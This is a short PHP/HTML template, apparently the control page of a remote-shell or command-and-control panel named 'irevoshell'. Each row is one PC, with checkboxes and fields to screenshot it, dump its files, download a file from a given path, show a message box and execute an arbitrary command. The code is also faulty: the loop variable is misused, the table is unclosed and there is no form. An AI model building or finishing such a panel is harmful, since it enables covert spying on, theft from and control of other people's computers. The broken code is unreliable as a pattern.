<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>irevoshell</title>
</head>
<body>
<div id="punlogin" class="pun">
    <div class="topbox"></div>
    <div class="punwrap">
        <?php include('header.php') ?>
        <div id="brdmain">
            <div class="blockform">
                <h2><span>Controls</span></h2>
                <div class="box">
                    <table>
                        <?php foreach ($pcs as $pcquery[0]) {?>
                            <tr>
                                <td><?php echo $pcs; ?></td>
                                <td><input type="checkbox" name="screenshot"></td>
                                <td><input type="checkbox" name="dumpfiles"></td>
                                <td><input type="checkbox" name="downloadfile"></td>
                                <td><input type="text" name="filedlpath"></td>
                                <td><input type="checkbox" name="showmsgbox"></td>
                                <td><input type="text" name="msgtoshow"></td>
                                <td><input type="checkbox" name="runcmd"></td>
                                <td><input type="text" name="toexec"></td>
                            </tr> 
                        <?php } ?>   
                </div>
            </div>
        <?php include('footer.php') ?>
    </div>
</div>
</body>
</html>